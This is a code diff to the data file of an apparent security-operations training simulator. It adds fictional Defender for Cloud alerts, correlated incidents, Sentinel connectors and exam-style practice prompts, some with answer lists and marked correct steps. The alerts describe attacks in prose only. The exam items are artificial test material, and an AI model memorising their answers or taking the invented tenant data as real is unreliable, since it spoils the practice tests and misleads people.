@@ -1474,7 +1919,7 @@ const ENTRA_IDENTITY_INVESTIGATIONS = [
       { time:'2026-06-28T06:43:00Z', type:'Token replay', risk:'High', source:'Entra ID Protection', detail:'Session cookie reused from a different ASN.' },
     ],
     signIns:[
-      { time:'2026-06-28T06:39:00Z', app:'Microsoft 365 portal', ip:'185.199.111.12', location:'US', result:'Success', risk:'High' },
+      { time:'2026-06-28T06:39:00Z', app:'365 portal', ip:'185.199.111.12', location:'US', result:'Success', risk:'High' },
       { time:'2026-06-28T06:44:00Z', app:'SharePoint Online', ip:'185.199.111.12', location:'US', result:'Interrupted', risk:'High' },
     ],
     actions:['Confirm compromise','Revoke sessions','Reset password','Require phishing-resistant MFA'],
@@ -1559,49 +2004,51 @@ const SENTINEL_WORKBOOKS = [
 const SENTINEL_PLAYBOOKS = [
   { name:'PB-IsolateDevice', trigger:'High-severity MDE alert', connector:'Defender for Endpoint',
     status:'Disabled', steps:['Get alert evidence','Isolate device','Post Teams approval card','Create ticket'] },
-  { name:'PB-RevokeOAuthConsent', trigger:'OAuth consent abuse incident', connector:'Microsoft Graph',
+  { name:'PB-RevokeOAuthConsent', trigger:'OAuth consent abuse incident', connector:'Graph',
     status:'Enabled', steps:['Find service principal','Revoke grant','Revoke user sessions','Notify mailbox owner'] },
   { name:'PB-StoragePublicAccess', trigger:'Public cloud storage alert', connector:'Azure + AWS',
     status:'Enabled', steps:['Remove public ACL','Snapshot configuration','Open owner task','Add incident comment'] },
-  { name:'PB-ContainEntity', trigger:'Entity trigger', connector:'Microsoft Sentinel + Logic Apps',
+  { name:'PB-ContainEntity', trigger:'Entity trigger', connector:'Sentinel + Logic Apps',
     status:'Enabled', resourceGroup:'RG-Entity-Playbooks', permissionState:'Ready',
     steps:['Receive entity pivot context','Collect linked incidents','Contain entity in a bounded playbook','Add response notes to the case'] },
-  { name:'Playbook1', trigger:'Microsoft Sentinel incident', connector:'Microsoft Sentinel + Logic Apps',
+  { name:'Playbook1', trigger:'Sentinel incident', connector:'Sentinel + Logic Apps',
     status:'Enabled', resourceGroup:'RG-Playbooks', permissionState:'Needs Sentinel access',
-    steps:['Receive Microsoft Sentinel incident','Get incident details','Post Teams notification','Add incident comment'] },
+    steps:['Receive Sentinel incident','Get incident details','Post Teams notification','Add incident comment'] },
 ];
 
 const SENTINEL_AUTOMATION_LAB = {
-  source:'Microsoft Learn: Run playbooks from automation rules',
+  source:'Product documentation: Run playbooks from automation rules',
   resourceGroup:'RG-Playbooks',
   playbookName:'Playbook1',
-  serviceAccount:'Microsoft Sentinel service account',
-  role:'Microsoft Sentinel Automation Contributor',
+  serviceAccount:'Sentinel service account',
+  role:'Sentinel Automation Contributor',
   workspace:'soc-prod-sentinel',
   ruleDraft:{
     name:'Run Playbook1 when incident is created',
     trigger:'When incident is created',
-    condition:'Incident provider = Microsoft Sentinel',
+    condition:'Incident provider = Sentinel',
     action:'Run playbook'
   },
   permissions:[
     { principal:'alex.ansbergs', role:'Logic App Contributor', scope:'RG-Playbooks', effect:'Can edit Logic App workflow; does not let Sentinel invoke it.' },
-    { principal:'Microsoft Sentinel service account', role:'Microsoft Sentinel Automation Contributor', scope:'RG-Playbooks', effect:'Lets automation rules run incident-trigger playbooks in the resource group.' },
+    { principal:'Sentinel service account', role:'Sentinel Automation Contributor', scope:'RG-Playbooks', effect:'Lets automation rules run incident-trigger playbooks in the resource group.' },
   ],
   notes:[
-    'Only playbooks that use a Microsoft Sentinel incident trigger are valid for automation rules triggered by incident creation.',
+    'Only playbooks that use a Sentinel incident trigger are valid for automation rules triggered by incident creation.',
     'A playbook shown grayed out in the Run playbook action means Sentinel lacks permission to the playbook resource group.',
-    'Use Manage playbook permissions from the automation rule action and grant Microsoft Sentinel access to the resource group.'
+    'Use Manage playbook permissions from the automation rule action and grant Sentinel access to the resource group.'
   ]
 };
 
 const SENTINEL_DATA_CONNECTORS = [
-  { name:'Microsoft Defender XDR', type:'Data connector', status:'Connected',
+  { name:'Defender XDR', type:'Data connector', status:'Connected',
     table:'SecurityAlert, Device*', use:'Streams Defender alerts and endpoint evidence into Sentinel incidents and hunting.' },
-  { name:'Microsoft Entra ID', type:'Data connector', status:'Connected',
+  { name:'Entra ID', type:'Data connector', status:'Connected',
     table:'SigninLogs, AuditLogs', use:'Provides sign-in, risk, and directory audit events for identity detections.' },
   { name:'Azure Activity', type:'Data connector', status:'Connected',
     table:'AzureActivity', use:'Collects subscription control-plane operations through Azure Policy or diagnostic settings for cloud administration detections.' },
+  { name:'Azure Key Vault', type:'Diagnostic settings-based data connector', status:'Practice simulator',
+    table:'AzureDiagnostics', use:'Collects Key Vault audit logs through diagnostic settings. The gallery status turns green only when data has arrived within the last 14 days.' },
   { name:'Windows Security Events via AMA', type:'Data connector', status:'Requires solution',
     table:'SecurityEvent, WindowsEvent', use:'Collects selected Windows Security Event IDs from servers and workstations through Azure Monitor Agent and a scoped DCR.' },
   { name:'Common Event Format via AMA', type:'Data connector', status:'Requires solution',
@@ -1611,7 +2058,7 @@ const SENTINEL_DATA_CONNECTORS = [
   { name:'Threat Intelligence - TAXII', type:'Threat intelligence connector', status:'Available',
     table:'ThreatIntelIndicators', use:'Imports STIX/TAXII indicators when a TAXII API root and collection ID are available.' },
   { name:'Defender Threat Intelligence', type:'Threat intelligence connector', status:'Available',
-    table:'ThreatIntelIndicators', use:'Brings Microsoft-generated indicators into Sentinel for TI map analytics rules.' },
+    table:'ThreatIntelIndicators', use:'Brings vendor-generated indicators into Sentinel for TI map analytics rules.' },
   { name:'Syslog via AMA', type:'Data connector', status:'Requires solution',
     table:'Syslog', use:'Ingests Syslog from Linux log forwarders after the Syslog solution is installed from Content hub and a DCR is created from the connector page.' },
   { name:'MITRE ATT&CK', type:'Coverage view', status:'Not a connector',
@@ -1619,19 +2066,19 @@ const SENTINEL_DATA_CONNECTORS = [
 ];
 
 const SENTINEL_CONTENT_SOLUTIONS = [
-  { id:'syslog', name:'Syslog', provider:'Microsoft', status:'Not installed',
+  { id:'syslog', name:'Syslog', provider:'Contoso', status:'Not installed',
     connectors:['Syslog via AMA'],
     use:'Adds the Syslog via AMA connector and workbook content for Linux Syslog ingestion.' },
-  { id:'cef', name:'Common Event Format (CEF)', provider:'Microsoft', status:'Not installed',
+  { id:'cef', name:'Common Event Format (CEF)', provider:'Contoso', status:'Not installed',
     connectors:['Common Event Format via AMA'],
     use:'Adds the CEF via AMA connector for appliances that emit CEF-formatted Syslog.' },
-  { id:'threat-intel', name:'Threat Intelligence', provider:'Microsoft', status:'Installed',
+  { id:'threat-intel', name:'Threat Intelligence', provider:'Contoso', status:'Installed',
     connectors:['Defender Threat Intelligence','Threat Intelligence - TAXII'],
     use:'Adds threat intelligence connectors and analytic content for indicator matching.' },
-  { id:'windows-security', name:'Windows Security Events', provider:'Microsoft', status:'Installed',
+  { id:'windows-security', name:'Windows Security Events', provider:'Contoso', status:'Installed',
     connectors:['Windows Security Events via AMA'],
     use:'Adds Windows event collection with Azure Monitor Agent and DCR scoping.' },
-  { id:'azure-activity', name:'Azure Activity', provider:'Microsoft', status:'Installed',
+  { id:'azure-activity', name:'Azure Activity', provider:'Contoso', status:'Installed',
     connectors:['Azure Activity'],
     use:'Adds subscription activity collection guidance for Azure Policy and diagnostic settings.' },
   { id:'custom-logs', name:'Custom logs ingestion', provider:'Lab', status:'Planning only',
@@ -1639,8 +2086,23 @@ const SENTINEL_CONTENT_SOLUTIONS = [
     use:'Study card for custom table ingestion through app registration, DCE/DCR endpoints, streams, and transforms.' },
 ];
 
+const DIAGNOSTIC_SETTINGS_PRACTICE = {
+  title:'Practice mode (Beta): diagnostic settings connector simulator',
+  connector:'Azure Key Vault',
+  workspace:'soc-prod-sentinel',
+  resource:'Azure Key Vault instances',
+  thresholdDays:14,
+  examPrompt:'The Key Vault instances in the subscription were decommissioned three weeks ago and no diagnostic log data has been ingested since. Practice the status logic the gallery uses.',
+  steps:[
+    { id:'aged', title:'Replay the exam case', detail:'Three weeks without ingestion should show Disconnected even if the connector was previously configured.' },
+    { id:'fresh', title:'Simulate fresh ingestion', detail:'A new event resets the 14-day window and the gallery returns to Connected.' },
+    { id:'not-configured', title:'Clear the configuration', detail:'If no diagnostic setting exists at all, the gallery should show Not configured.' },
+  ],
+  answers:['Connected', 'Disconnected', 'Not configured'],
+};
+
 const SYSLOG_AMA_LAB = {
-  source:'Microsoft Learn: Ingest Syslog and CEF messages to Microsoft Sentinel with AMA',
+  source:'Product documentation: Ingest Syslog and CEF messages to Sentinel with AMA',
   workspace:'soc-prod-sentinel',
   vm:'VM1',
   os:'Linux Azure VM',
@@ -1650,13 +2112,13 @@ const SYSLOG_AMA_LAB = {
   solution:'Syslog',
   facilities:['auth','authpriv','daemon','kern','syslog','user'],
   minimumLevel:'Info',
-  examPrompt:'Several network appliances send Syslog messages to VM1. Configure Syslog via AMA ingestion into Microsoft Sentinel.',
+  examPrompt:'Several network appliances send Syslog messages to VM1. Configure Syslog via AMA ingestion into Sentinel.',
   steps:[
     { id:'solution', title:'Install Syslog solution from Content hub',
-      detail:'Content hub installs the solution package that exposes the Syslog via AMA data connector in Microsoft Sentinel.',
+      detail:'Content hub installs the solution package that exposes the Syslog via AMA data connector in Sentinel.',
       correctFirst:true },
     { id:'connector', title:'Open Syslog via AMA connector',
-      detail:'Use the connector page in Microsoft Sentinel to create the data collection rule instead of starting in the Azure Monitor portal.' },
+      detail:'Use the connector page in Sentinel to create the data collection rule instead of starting in the Azure Monitor portal.' },
     { id:'dcr', title:'Create the DCR and select VM1',
       detail:'The connector workflow creates the DCR, scopes facilities/severities, and installs Azure Monitor Agent on the selected VM.' },
     { id:'daemon', title:'Configure rsyslog on VM1',
@@ -1784,7 +2246,7 @@ const SENTINEL_INGESTION_LABS = [
       { id:'stream', title:'Declare stream and transform',
         detail:'Define streamDeclarations for the incoming JSON and transformKql to shape columns into the destination table.' },
       { id:'table', title:'Create _CL table output',
-        detail:'Custom streams usually use Custom- prefixes and land in a _CL table such as AppRiskEvents_CL; Microsoft- streams target supported built-in schemas.' },
+        detail:'Custom streams usually use Custom- prefixes and land in a _CL table such as AppRiskEvents_CL; Cloud- streams target supported built-in schemas.' },
       { id:'verify', title:'Verify custom rows',
         detail:'Query AppRiskEvents_CL and validate TimeGenerated, AppId, RiskScore, SourceIp, and Action columns.' },
     ],
@@ -1871,25 +2333,255 @@ SyntheticTransactions_CL
 | join kind=inner ActiveIOCs on $left.Domain == $right.IOCValue
 | project TimeGenerated, SrcIp, DstIp, Domain, Url, AccountName, Action, Scenario, IOCValue, ObservableKey, Confidence, Tags`;
 
+// Defender for Cloud workload-protection alerts.
+//
+// Field shape mirrors what the real Security alerts details pane surfaces:
+// severity / status / activity time, a description of the detected activity,
+// the affected resource, and the kill-chain intent on the MITRE ATT&CK matrix.
+// `mitigation` and `recommendations` back the Take action tab; `incidentId`
+// links the alert into a correlated security incident (CLOUD_INCIDENTS).
+//
+// Statuses are the three Defender for Cloud alert states: Active, Dismissed,
+// Resolved. (These are NOT the Defender XDR New/In progress/Resolved states —
+// keeping them distinct is itself an exam-relevant detail.)
 const CLOUD_ALERTS = [
-  { severity:'high', title:'Suspicious SSH login (Defender for Servers)', resource:'vm-prod-web-01',
-    type:'Virtual machine', status:'New', time:'2026-06-28T11:23:00Z', tactics:['Initial Access'] },
-  { severity:'high', title:'Public IP scanning detected on container', resource:'aks-prod / pod-api-77',
-    type:'Kubernetes workload', status:'In progress', time:'2026-06-28T12:01:00Z', tactics:['Discovery'] },
-  { severity:'medium', title:'Storage account anonymous access enabled', resource:'stcontosologs',
-    type:'Storage account', status:'New', time:'2026-06-28T07:50:00Z', tactics:['Exfiltration'] },
-  { severity:'high', title:'Container escaped to host namespace', resource:'aks-prod/node-3',
-    type:'Kubernetes node', status:'In progress', time:'2026-06-28T12:03:00Z', tactics:['Privilege Escalation'] },
-  { severity:'medium', title:'SQL server firewall opened to internet', resource:'sql-prod-reporting',
-    type:'SQL server', status:'New', time:'2026-06-28T09:18:00Z', tactics:['Initial Access'] },
-  { severity:'low', title:'Key vault accessed from unusual network', resource:'kv-prod-app',
-    type:'Key vault', status:'New', time:'2026-06-28T04:12:00Z', tactics:['Credential Access'] },
-  { severity:'medium', title:'New privileged role assignment in subscription', resource:'sub-prod-001',
-    type:'Subscription', status:'Resolved', time:'2026-06-27T22:43:00Z', tactics:['Privilege Escalation'] },
-  { severity:'low', title:'Container image has critical CVE with exploit available', resource:'acrprod.azurecr.io/api',
-    type:'Container image', status:'New', time:'2026-06-27T18:06:00Z', tactics:['Execution'] },
-  { severity:'medium', title:'App Service authentication disabled', resource:'app-customer-portal',
-    type:'App Service', status:'New', time:'2026-06-27T16:21:00Z', tactics:['Initial Access'] },
+  { id:'dfc-alert-01', severity:'high', title:'Suspicious SSH login from a rare source address', resource:'vm-prod-web-01',
+    type:'Virtual machine', status:'Active', time:'2026-06-28T11:23:00Z', endTime:'2026-06-28T11:41:00Z',
+    tactics:['Initial Access'], plan:'Defender for Servers', scope:'sub-prod-001', incidentId:'dfc-inc-01',
+    description:'An interactive SSH session succeeded on an internet-facing virtual machine from an address that has never authenticated to this subscription before, immediately after a burst of failed attempts. The pattern is consistent with a successful password-guessing attack.',
+    entities:[
+      { type:'IP address', value:'203.0.113.44' },
+      { type:'Account',    value:'svc-deploy' },
+      { type:'Host',       value:'vm-prod-web-01' },
+      { type:'Process',    value:'/usr/sbin/sshd' },
+    ],
+    evidence:{ 'Failed attempts':'184 in 6 minutes', 'Authentication type':'Password', 'Source geography':'Unfamiliar for this subscription', 'Session length':'18 minutes' },
+    mitigation:[
+      'Confirm with the resource owner whether the sign-in was expected maintenance activity.',
+      'Review the VM authentication log and the subscription activity log for the same source address.',
+      'Rotate the credentials for svc-deploy and revoke any keys the session could have read.',
+      'If the activity is unauthorized, isolate the VM before further triage.',
+    ],
+    recommendations:[
+      'Management ports of virtual machines should be protected with just-in-time network access control',
+      'Virtual machines should be reachable only through an approved bastion or VPN path',
+    ] },
+
+  { id:'dfc-alert-02', severity:'high', title:'Outbound port scanning from a container workload', resource:'aks-prod / pod-api-77',
+    type:'Kubernetes workload', status:'Active', time:'2026-06-28T12:01:00Z', endTime:'2026-06-28T12:09:00Z',
+    tactics:['Discovery'], plan:'Defender for Containers', scope:'sub-prod-001', incidentId:'dfc-inc-02',
+    description:'A pod in the production cluster generated a high volume of connection attempts across a wide address range in a short window. Application pods rarely sweep the network, so this is typically post-compromise reconnaissance.',
+    entities:[
+      { type:'Kubernetes pod',      value:'pod-api-77' },
+      { type:'Kubernetes cluster',  value:'aks-prod' },
+      { type:'Process',             value:'/tmp/.scan' },
+      { type:'Service account',     value:'api-runner' },
+    ],
+    evidence:{ 'Destinations contacted':'2,414', 'Ports probed':'22, 445, 3389, 6443', 'Binary location':'Writable /tmp path', 'Image':'acrprod.azurecr.io/api:2026.06' },
+    mitigation:[
+      'Capture the pod spec and running process list before deleting the pod.',
+      'Check whether the same image is running elsewhere in the cluster.',
+      'Restrict egress from the namespace while the investigation is open.',
+    ],
+    recommendations:[
+      'Container images should be scanned for vulnerabilities before deployment',
+      'Kubernetes clusters should restrict pod egress to approved destinations',
+    ] },
+
+  { id:'dfc-alert-03', severity:'medium', title:'Anonymous public read access enabled on a storage account', resource:'stcontosologs',
+    type:'Storage account', status:'Active', time:'2026-06-28T07:50:00Z', endTime:'2026-06-28T07:50:00Z',
+    tactics:['Exfiltration'], plan:'Defender for Storage', scope:'sub-prod-001', incidentId:'dfc-inc-01',
+    description:'Anonymous container-level read access was turned on for a storage account that holds application logs, and blob listing calls from an external address followed within minutes. Data in the account is currently reachable without authentication.',
+    entities:[
+      { type:'Storage account', value:'stcontosologs' },
+      { type:'IP address',      value:'203.0.113.44' },
+      { type:'Account',         value:'svc-deploy' },
+    ],
+    evidence:{ 'Container':'app-logs', 'Access level set to':'Blob (anonymous read)', 'List calls after change':'96', 'Bytes read':'1.4 GB' },
+    mitigation:[
+      'Set the container access level back to Private and confirm the change took effect.',
+      'Review storage diagnostic logs to scope what was read while access was open.',
+      'Verify whether the identity that made the change was expected to have that permission.',
+    ],
+    recommendations:[
+      'Storage accounts should prevent anonymous public access to blob containers',
+      'Storage accounts should restrict network access to selected virtual networks',
+    ] },
+
+  { id:'dfc-alert-04', severity:'high', title:'Container process escaped to the host namespace', resource:'aks-prod/node-3',
+    type:'Kubernetes node', status:'Active', time:'2026-06-28T12:03:00Z', endTime:'2026-06-28T12:04:00Z',
+    tactics:['Privilege Escalation'], plan:'Defender for Containers', scope:'sub-prod-001', incidentId:'dfc-inc-02',
+    description:'A privileged container mounted the host namespace and started a process outside its own cgroup. Once a workload reaches the node, it inherits the node identity and any secrets that identity can read.',
+    entities:[
+      { type:'Kubernetes node',    value:'aks-prod/node-3' },
+      { type:'Kubernetes pod',     value:'pod-api-77' },
+      { type:'Process',            value:'nsenter' },
+      { type:'Managed identity',   value:'aks-prod-node-mi' },
+    ],
+    evidence:{ 'Security context':'privileged: true', 'Host mounts':'/proc, /var/run/docker.sock', 'Node identity can read':'kv-prod-app', 'Parent pod':'pod-api-77' },
+    mitigation:[
+      'Cordon and drain the node, then rebuild it from a known image.',
+      'Rotate any secret the node identity could reach, starting with kv-prod-app.',
+      'Block privileged pod admission in the namespace.',
+    ],
+    recommendations:[
+      'Privileged containers should be blocked by Kubernetes admission control',
+      'Kubernetes clusters should not allow host namespace sharing',
+    ] },
+
+  { id:'dfc-alert-05', severity:'medium', title:'SQL server firewall rule opened to the entire internet', resource:'sql-prod-reporting',
+    type:'SQL server', status:'Active', time:'2026-06-28T09:18:00Z', endTime:'2026-06-28T09:18:00Z',
+    tactics:['Initial Access'], plan:'Defender for SQL', scope:'sub-prod-001', incidentId:null,
+    description:'A server-level firewall rule was created that permits connections from any source address. The database behind it holds customer export tables, so the change removes the last network control in front of that data.',
+    entities:[
+      { type:'SQL server', value:'sql-prod-reporting' },
+      { type:'Account',    value:'dba-oncall@contoso.com' },
+      { type:'IP range',   value:'0.0.0.0 - 255.255.255.255' },
+    ],
+    evidence:{ 'Rule name':'temp-report-access', 'Change source':'Portal', 'Databases exposed':'reporting, exports', 'Auditing':'Enabled' },
+    mitigation:[
+      'Delete the permissive rule and replace it with the approved address range.',
+      'Review SQL audit records for logins accepted while the rule was in place.',
+    ],
+    recommendations:[
+      'SQL servers should not allow ingress from all internet addresses',
+      'SQL databases should have auditing and threat protection enabled',
+    ] },
+
+  { id:'dfc-alert-06', severity:'low', title:'Key vault accessed from an unfamiliar network', resource:'kv-prod-app',
+    type:'Key vault', status:'Active', time:'2026-06-28T04:12:00Z', endTime:'2026-06-28T04:13:00Z',
+    tactics:['Credential Access'], plan:'Defender for Key Vault', scope:'sub-prod-001', incidentId:'dfc-inc-01',
+    description:'Secrets were listed and read from a key vault by an identity that normally reaches it from inside the virtual network. The access succeeded, so this may be a legitimate operator working remotely — or a stolen token being replayed.',
+    entities:[
+      { type:'Key vault',  value:'kv-prod-app' },
+      { type:'IP address', value:'203.0.113.44' },
+      { type:'Account',    value:'svc-deploy' },
+    ],
+    evidence:{ 'Operations':'SecretList, SecretGet x4', 'Secrets touched':'storage-key, api-signing-key', 'Usual source':'vnet-prod internal range', 'Result':'Success' },
+    mitigation:[
+      'Ask the identity owner whether the access was expected.',
+      'Rotate the secrets that were read if the access cannot be accounted for.',
+    ],
+    recommendations:[
+      'Key vaults should restrict network access to trusted networks only',
+      'Key vault secrets should have an expiration date set',
+    ] },
+
+  { id:'dfc-alert-07', severity:'medium', title:'Owner role assigned at subscription scope outside of change control', resource:'sub-prod-001',
+    type:'Subscription', status:'Resolved', time:'2026-06-27T22:43:00Z', endTime:'2026-06-27T22:43:00Z',
+    tactics:['Privilege Escalation'], plan:'Defender CSPM', scope:'sub-prod-001', incidentId:null,
+    description:'A new Owner assignment was created at subscription scope late in the day with no matching change record. The assignment was reviewed with the platform team and confirmed as an approved emergency access grant.',
+    entities:[
+      { type:'Subscription', value:'sub-prod-001' },
+      { type:'Account',      value:'platform-admin@contoso.com' },
+      { type:'Role',         value:'Owner' },
+    ],
+    evidence:{ 'Principal type':'User', 'Assigned by':'break-glass-01@contoso.com', 'Change record':'Filed retroactively', 'Duration':'Permanent' },
+    mitigation:[
+      'Convert the standing assignment to a time-bound, approval-gated one.',
+      'Confirm the break-glass account is covered by alerting on every use.',
+    ],
+    recommendations:[
+      'Subscriptions should have no more than three permanent Owner assignments',
+      'Privileged roles should be granted through time-bound activation',
+    ] },
+
+  { id:'dfc-alert-08', severity:'low', title:'Running container image carries a vulnerability with a known exploit', resource:'acrprod.azurecr.io/api',
+    type:'Container image', status:'Active', time:'2026-06-27T18:06:00Z', endTime:'2026-06-27T18:06:00Z',
+    tactics:['Execution'], plan:'Defender for Containers', scope:'sub-prod-001', incidentId:'dfc-inc-02',
+    description:'A vulnerability with a publicly available exploit was found in an image that is currently running in the production cluster. On its own this is a posture finding; alongside the workload alerts on the same cluster it becomes the likely entry point.',
+    entities:[
+      { type:'Container image',    value:'acrprod.azurecr.io/api:2026.06' },
+      { type:'Kubernetes cluster', value:'aks-prod' },
+      { type:'Registry',           value:'acrprod.azurecr.io' },
+    ],
+    evidence:{ 'Severity of finding':'Critical', 'Exploit maturity':'Public exploit available', 'Running pods on this image':'6', 'Fixed in':'Vendor patch published' },
+    mitigation:[
+      'Rebuild the image against the patched base layer and roll the deployment.',
+      'Block the vulnerable tag from being pulled again.',
+    ],
+    recommendations:[
+      'Container images should be scanned for vulnerabilities before deployment',
+      'Running container images should have vulnerability findings resolved',
+    ] },
+
+  { id:'dfc-alert-09', severity:'medium', title:'App Service built-in authentication turned off', resource:'app-customer-portal',
+    type:'App Service', status:'Dismissed', time:'2026-06-27T16:21:00Z', endTime:'2026-06-27T16:21:00Z',
+    tactics:['Initial Access'], plan:'Defender for App Service', scope:'sub-prod-001', incidentId:null,
+    description:'Built-in authentication was disabled on a public-facing web app. The application team confirmed the app moved to its own identity library in this release, so the alert was dismissed as expected behavior.',
+    entities:[
+      { type:'App Service', value:'app-customer-portal' },
+      { type:'Account',     value:'appdev-lead@contoso.com' },
+    ],
+    evidence:{ 'Previous setting':'Enabled (Entra ID)', 'Change source':'Deployment pipeline', 'App exposure':'Public endpoint', 'Verified by':'Application team' },
+    mitigation:[
+      'Confirm the replacement authentication path enforces the same conditional access policies.',
+      'Record the exception so future alerts on this app are triaged quickly.',
+    ],
+    recommendations:[
+      'App Service apps should require authentication before serving requests',
+      'App Service apps should only be reachable over HTTPS',
+    ] },
+
+  { id:'dfc-alert-10', severity:'informational', title:'Diagnostic log settings changed on a production resource', resource:'vm-prod-web-01',
+    type:'Virtual machine', status:'Active', time:'2026-06-28T11:47:00Z', endTime:'2026-06-28T11:47:00Z',
+    tactics:['Defense Evasion'], plan:'Defender for Servers', scope:'sub-prod-001', incidentId:'dfc-inc-01',
+    description:'Diagnostic settings on a virtual machine were narrowed shortly after an interactive sign-in. Log configuration changes are routine on their own, which is why this is informational — but in the context of the other alerts on this host it looks like an attempt to reduce what gets recorded.',
+    entities:[
+      { type:'Host',    value:'vm-prod-web-01' },
+      { type:'Account', value:'svc-deploy' },
+    ],
+    evidence:{ 'Categories removed':'Authentication, Administrative', 'Destination':'Log Analytics workspace contoso-sec-prod', 'Time from sign-in':'24 minutes', 'Reverted':'No' },
+    mitigation:[
+      'Restore the previous diagnostic categories and confirm data is flowing again.',
+      'Treat the gap window as unmonitored when scoping the rest of the investigation.',
+    ],
+    recommendations:[
+      'Virtual machines should stream security-relevant logs to a Log Analytics workspace',
+    ] },
+];
+
+// Security incidents — a security incident is a correlation of alerts that
+// share an entity (resource, IP address, user) or a kill-chain pattern. The
+// same alert can belong to an incident and still appear as a standalone alert
+// in the list, which is why the table below keeps every member alert visible.
+const CLOUD_INCIDENTS = [
+  {
+    id:'dfc-inc-01',
+    name:'Security incident detected suspicious data exfiltration activity',
+    severity:'high',
+    cloud:'Azure',
+    sharedEntity:'IP address 203.0.113.44 and the svc-deploy identity',
+    attackPathId:'dfc-path-01',
+    alertIds:['dfc-alert-01','dfc-alert-06','dfc-alert-03','dfc-alert-10'],
+    time:'2026-06-28T11:23:00Z',
+    status:'Active',
+    story:'A password-guessing attack succeeds against an internet-facing VM. The same source address then reads secrets from the key vault the host identity can reach, diagnostic logging is narrowed, and anonymous read access is switched on for the log storage account — at which point 1.4 GB leaves the tenant. Individually these are a high, a low, an informational, and a medium alert; correlated, they are one exfiltration chain.',
+  },
+  {
+    id:'dfc-inc-02',
+    name:'Security incident detected suspicious Kubernetes cluster activity',
+    severity:'high',
+    cloud:'Azure',
+    sharedEntity:'Cluster aks-prod and the pod-api-77 workload',
+    attackPathId:'dfc-path-02',
+    alertIds:['dfc-alert-08','dfc-alert-02','dfc-alert-04'],
+    time:'2026-06-28T12:01:00Z',
+    status:'Active',
+    story:'A vulnerable image with a public exploit is already running in the cluster. The pod built from it starts sweeping the network, then a privileged container mounts the host namespace and reaches the node identity. The posture finding is the entry point; the workload alerts are the consequences.',
+  },
+  {
+    id:'dfc-inc-03',
+    name:'Security incident detected suspicious activity across connected clouds',
+    severity:'high',
+    cloud:'AWS + GCP',
+    sharedEntity:'A reused operator account seen in both the AWS account and the GCP project',
+    attackPathId:'mc-path-1',
+    alertIds:['alert-b-bbbb2222-3','alert-a-bbbb2222-5'],
+    time:'2026-06-28T11:55:00Z',
+    status:'Active',
+    story:'Failed key-pair authentication against an AWS VM is followed by an unexpected role assumption inside a GCP container cluster, using the same operator identity. Neither connector alone tells the story — correlation across the AWS and GCP connectors is what makes this one incident rather than two unrelated mid-severity alerts.',
+  },
 ];
 
 // Synthetic Log Analytics workspaces — selector at top of Sentinel views scopes rules to one of these.
@@ -1904,28 +2596,28 @@ const MSSP_TENANTS = [
     id: 'tn-1',
     name: 'Northwind Trading Co.',
     workspaces: ['Workspace A'],
-    delegatedRoles: ['Microsoft Sentinel Reader'],
+    delegatedRoles: ['Sentinel Reader'],
     status: 'Active'
   },
   {
     id: 'tn-2',
     name: 'BlueHarbor Logistics Ltd.',
     workspaces: ['Workspace B', 'Workspace C'],
-    delegatedRoles: ['Microsoft Sentinel Contributor', 'Microsoft Sentinel Responder'],
+    delegatedRoles: ['Sentinel Contributor', 'Sentinel Responder'],
     status: 'Pending'
   },
   {
     id: 'tn-3',
     name: 'SeaShell Enterprises Inc.',
     workspaces: ['Workspace D'],
-    delegatedRoles: ['Microsoft Sentinel Reader'],
+    delegatedRoles: ['Sentinel Reader'],
     status: 'Active'
   },
   {
     id: 'tn-4',
     name: 'Albatross Shipping Corp.',
     workspaces: ['Workspace E'],
-    delegatedRoles: ['Microsoft Sentinel Contributor'],
+    delegatedRoles: ['Sentinel Contributor'],
     status: 'Pending'
   }
 ];
@@ -2050,7 +2742,7 @@ const SENTINEL_LIVESTREAM_ROWS = [
   { TimeGenerated:'2026-07-06T08:20:44Z', AccountDisplayName:'Jane Doe', ActionType:'Mail.Read', AppId:'b9f2-demo-ad21', SourceIp:'76.21.55.4', RiskScore:89, Signal:'Mailbox access after consent' },
   { TimeGenerated:'2026-07-06T08:21:33Z', AccountDisplayName:'Jane Doe', ActionType:'Files.Read.All', AppId:'b9f2-demo-ad21', SourceIp:'76.21.55.4', RiskScore:91, Signal:'OneDrive enumeration' },
   { TimeGenerated:'2026-07-06T08:23:19Z', AccountDisplayName:'Sam Lee', ActionType:'HighRiskTokenUse', AppId:'graph-powershell-demo', SourceIp:'91.219.236.54', RiskScore:78, Signal:'MFA-proxied follow-up' },
-  { TimeGenerated:'2026-07-06T08:24:02Z', AccountDisplayName:'Maria Ross', ActionType:'Risky sign-in', AppId:'login.microsoftonline.com', SourceIp:'185.199.111.12', RiskScore:96, Signal:'AiTM sign-in telemetry' },
+  { TimeGenerated:'2026-07-06T08:24:02Z', AccountDisplayName:'Maria Ross', ActionType:'Risky sign-in', AppId:'login.identity.example', SourceIp:'185.199.111.12', RiskScore:96, Signal:'AiTM sign-in telemetry' },
 ];
 
 const SENTINEL_BOOKMARK_SUGGESTIONS = [
@@ -2264,22 +2956,31 @@ const SENTINEL_ANALYTICS_RULE_TYPES = [
     } },
 ];
 
+// Anomaly rules carry a Status (Enabled/Disabled) AND a Mode (Production/Flighting).
+// Production = results land in the Anomalies table and can drive incidents/enrichment.
+// Flighting  = a tuned copy runs side-by-side with Production for A/B comparison,
+//              WITHOUT affecting production results/incidents. Tune in Flighting,
+//              compare, then promote the tuned version to Production.
 const SENTINEL_ANOMALY_RULES = [
-  { name:'Anomalous sign-in location by user', status:'Enabled', source:'UEBA',
+  { name:'Anomalous sign-in location by user', status:'Enabled', mode:'Production', source:'UEBA',
     severity:'medium', threshold:'Medium and High anomalies', tactics:['Initial Access'],
     customization:'Exclude known travel IP ranges and service accounts.',
+    modeNote:'Baseline validated in Flighting last sprint; tuned copy promoted to Production.',
     feeds:'Hunting bookmarks, incident enrichment, and scheduled rules that join anomalies to SigninLogs.' },
-  { name:'Rare process on endpoint peer group', status:'Enabled', source:'Entity behavior',
-    severity:'medium', threshold:'Score >= 0.78', tactics:['Execution','Defense Evasion'],
+  { name:'Rare process on endpoint peer group', status:'Enabled', mode:'Flighting', source:'Entity behavior',
+    severity:'medium', threshold:'Score >= 0.78 (Flighting) vs 0.85 (Production)', tactics:['Execution','Defense Evasion'],
     customization:'Pilot on finance and Tier 0 device groups before broad incident creation.',
+    modeNote:'Testing a lower score threshold against the live Production copy — no incidents from this version yet.',
     feeds:'Hunting graph pivots and custom analytics rules that correlate rare process with risky sign-in.' },
-  { name:'Unusual data access volume', status:'Disabled', source:'Data lake baseline',
+  { name:'Unusual data access volume', status:'Disabled', mode:'Flighting', source:'Data lake baseline',
